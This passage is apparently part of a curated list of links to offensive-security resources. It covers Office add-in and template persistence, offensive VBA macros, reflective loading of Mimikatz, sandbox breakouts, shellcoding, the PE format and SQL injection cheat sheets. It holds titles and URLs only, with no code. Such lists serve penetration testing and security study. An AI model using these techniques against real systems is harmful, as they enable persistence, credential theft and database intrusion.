-   [[https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3\#file-example-js-L5-L6]{.underline}](https://gist.github.com/subTee/439fb5dba5edf4d1e3c38b9a24f886d3#file-example-js-L5-L6)

### Office Add-In Persistence (\@William\_Knows)

-   [[https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/]{.underline}](https://labs.mwrinfosecurity.com/blog/add-in-opportunities-for-office-persistence/)

### DLL Tricks with VBA to Improve Offensive Macro Capability

-   [[https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/]{.underline}](https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/)

### WePWNise - Office Template Persistence

-   [[https://github.com/mwrlabs/wePWNise]{.underline}](https://github.com/mwrlabs/wePWNise)

### Sentinel DLL/EXE Path Hijacking Detection Tool

-   [[https://skanthak.homepage.t-online.de/sentinel.html]{.underline}](https://skanthak.homepage.t-online.de/sentinel.html)

### Converting Mimikatz to a DLL to Be Loaded Reflectively

-   [[https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/]{.underline}](https://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/)

### Sandbox Breakouts (nodejs/javascript)

-   [[http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine]{.underline}](http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine)

Shellcoding
-----------

### 64-Bit Shellcoding Tutorial

-   [[http://mcdermottcybersecurity.com/articles/windows-x64-shellcode]{.underline}](http://mcdermottcybersecurity.com/articles/windows-x64-shellcode)

Portable Executable (PE) File Information
-----------------------------------------

### An In-Depth Look into the Win32 Portable Executable File Format

-   PDF files have been saved to Google Drive as they are no longer
    > available from Microsoft. [[Part
    > 1]{.underline}](https://drive.google.com/open?id=12XHlJU8Art2PyfqpGcYF4K64IPIitXK6),
    > [[Part 1
    > Figures]{.underline}](https://drive.google.com/open?id=1LZsLFq3MfLeeybbqmk6AM817bDjfng9r)
    > & [[Part
    > 2]{.underline}](https://drive.google.com/open?id=1xCtTgPR67vYz1YhVQV9uv4bhyk_8hlmD),
    > [[Part 2
    > Figures]{.underline}](https://drive.google.com/open?id=1IuKuF16oFUP5cKA6dm7BPLiYFp1jcRYK)

SQL Injection
-------------

-   [[https://websec.ca/kb/sql\_injection]{.underline}](https://websec.ca/kb/sql_injection)

-   [[https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/]{.underline}](https://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/)

-   [[https://portswigger.net/web-security/sql-injection/cheat-sheet]{.underline}](https://portswigger.net/web-security/sql-injection/cheat-sheet)

-   